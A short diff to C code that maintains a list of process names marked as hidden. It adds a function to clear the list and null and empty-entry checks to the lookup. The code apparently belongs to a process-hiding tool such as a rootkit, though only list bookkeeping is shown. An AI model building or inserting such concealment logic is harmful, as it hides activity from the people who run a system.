@@ -86,11 +86,23 @@ int remove_hidden_process(const char *process_name) {
     return -1; // Process not found
 }
 
+void clear_all_hidden_processes(void) {
+    int i;
+    for (i = 0; i < HIDE_PROCESS_LIST_SIZE; i++) {
+        memset(hidden_processes[i], 0, MAX_PROCESS_NAME_LEN);
+    }
+    hidden_process_count = 0;
+}
+
 bool is_process_hidden(const char *process_name) {
     int i;
     
+    if (!process_name) {
+        return false;
+    }
+    
     for (i = 0; i < hidden_process_count; i++) {
-        if (strstr(process_name, hidden_processes[i]) != NULL) {
+        if (hidden_processes[i][0] != '\0' && strstr(process_name, hidden_processes[i]) != NULL) {
             return true;
         }
     }
